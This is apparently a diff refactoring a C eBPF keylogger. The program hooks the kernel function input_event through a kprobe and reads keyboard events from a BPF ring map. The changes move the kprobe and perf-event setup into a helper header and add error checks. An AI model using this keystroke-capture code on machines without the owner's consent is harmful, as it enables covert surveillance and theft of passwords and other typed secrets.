@@ -6,17 +6,15 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <sys/ioctl.h>
 #include <syscall.h>
 #include <unistd.h>
+#include "kprobes.h"
 
 const int RING_SIZE = 31;
 
 int create_map();
 int create_program();
 int create_perf_event();
-int open_kprobe();
-void attach_program(int progFd, int perfFd);
 int pop_ring(int mapFd, int* type, int* code, int* value);
 void read_map(int mapFd, int idx, int* type, int* code, int* value);
 void write_map(int mapFd, int idx, int type, int code, int value);
@@ -25,7 +23,10 @@ int main() {
   int mapFd = create_map();
   int progFd = create_program(mapFd);
   int perfFd = create_perf_event();
-  attach_program(progFd, perfFd);
+  if (attach_program(progFd, perfFd)) {
+    perror("attach_program");
+    return 1;
+  }
   while (1) {
     int type;
     int code;
@@ -182,67 +183,12 @@ int create_program(int mapFd) {
 }
 
 int create_perf_event() {
-  // Re-use an existing kprobe if possible.
-  int res = open_kprobe();
-  if (res >= 0) {
-    return res;
-  }
-
-  FILE* fp = fopen("/sys/kernel/debug/tracing/kprobe_events", "wab");
-  if (!fp) {
-    perror("fopen");
+  int fd = create_open_kprobe("keylogger", "p:kprobes/keylogger input_event");
+  if (fd < 0) {
+    perror("create_open_kprobe");
     exit(1);
   }
-  if (fprintf(fp, "p:kprobes/keylogger input_event") < 0) {
-    goto fail;
-  }
-  if (fflush(fp)) {
-    goto fail;
-  }
-  fclose(fp);
-
-  res = open_kprobe();
-  if (res < 0) {
-    perror("open_kprobe");
-    exit(1);
-  }
-
-  return res;
-
-fail:
-  perror("create_perf_event");
-  fclose(fp);
-  exit(1);
-}
-
-int open_kprobe() {
-  FILE* fp =
-      fopen("/sys/kernel/debug/tracing/events/kprobes/keylogger/id", "rb");
-  if (!fp) {
-    return -1;
-  }
-  char config[512];
-  fread(config, sizeof(config), 1, fp);
-  fclose(fp);
-
-  struct perf_event_attr attr;
-  bzero(&attr, sizeof(attr));
-  attr.config = strtol(config, NULL, 0);
-  attr.type = PERF_TYPE_TRACEPOINT;
-  attr.sample_period = 1;
-  attr.wakeup_events = 1;
-  return syscall(__NR_perf_event_open, &attr, -1, 0, -1, PERF_FLAG_FD_CLOEXEC);
-}
-
-void attach_program(int progFd, int perfFd) {
-  if (ioctl(perfFd, PERF_EVENT_IOC_SET_BPF, progFd) < 0) {
-    perror("attach BPF");
-    exit(1);
-  }
-  if (ioctl(perfFd, PERF_EVENT_IOC_ENABLE, 0) < 0) {
-    perror("enable event");
-    exit(1);
-  }
+  return fd;
 }
 
 int pop_ring(int mapFd, int* type, int* code, int* value) {
